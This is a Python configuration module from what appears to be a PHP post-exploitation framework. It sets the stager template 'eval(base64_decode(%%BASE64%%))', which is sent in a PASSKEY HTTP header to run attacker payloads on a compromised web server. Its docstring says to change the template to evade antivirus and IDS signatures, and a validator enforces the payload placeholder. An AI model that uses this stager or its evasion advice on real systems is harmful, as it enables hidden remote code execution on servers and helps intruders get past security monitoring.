"""
Override default payload stager template.
It is used as PASSKEY HTTP Header value to execute the final
php payload.

This setting can be changed to improve stealth. Using a different
template than the default one is a good was to bypass static
Antivirus/IDS signatures.

Make sure that the global behavior remains the same.
Indeed, REQ_HEADER_PAYLOAD must base64_decode() '%%BASE64%%',
then eval() it to work properly.

NOTE: %%BASE64%% is a magic string that is replaced by the
      base64 payload to be executed at runtime.

* Only edit REQ_HEADER_PAYLOAD if you understand what you're doing
"""
import linebuf
import datatypes


linebuf_type = linebuf.RandLineBuffer


def validator(value):
    if value.find("%%BASE64%%") < 0:
        raise ValueError("shall contain %%BASE64%% string")
    return datatypes.PhpCode(value)


def default_value():
    return "eval(base64_decode(%%BASE64%%))"
